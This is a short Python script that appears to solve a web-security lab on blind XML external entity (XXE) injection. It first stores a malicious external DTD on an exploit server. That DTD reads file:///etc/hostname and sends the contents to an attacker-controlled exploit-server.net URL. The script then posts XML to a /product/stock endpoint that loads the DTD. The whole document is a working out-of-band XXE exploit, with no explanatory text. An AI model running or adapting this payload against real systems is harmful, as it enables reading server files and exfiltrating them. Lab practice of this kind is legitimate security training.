import requests
import re

burp0_url_create = "YOUR_URL_EXPLOIT_SERVER"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers",
    "Connection": "keep-alive"
}
burp0_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8", "responseBody": "<!ENTITY % file SYSTEM \"file:///etc/hostname\">\r\n<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0aca006104f0f8f3822f0a4601c3008d.exploit-server.net/exploit?x=%file;'>\">\r\n%eval;\r\n%exfiltrate;", "formAction": "STORE"}
requests.post(burp0_url_create, headers=burp0_headers, data=burp0_data)

burp0_url_send = "YOUR_URL/product/stock"
burp0_headers_send = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/xml",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0",
    "Te": "trailers"
}
burp0_data_send = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE foo[<!ENTITY % xxe SYSTEM \"YOUR_URL_EXPLOIT_SERVER\" > %xxe;]>\r\n<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
requests.post(burp0_url_send, headers=burp0_headers_send, data=burp0_data_send)
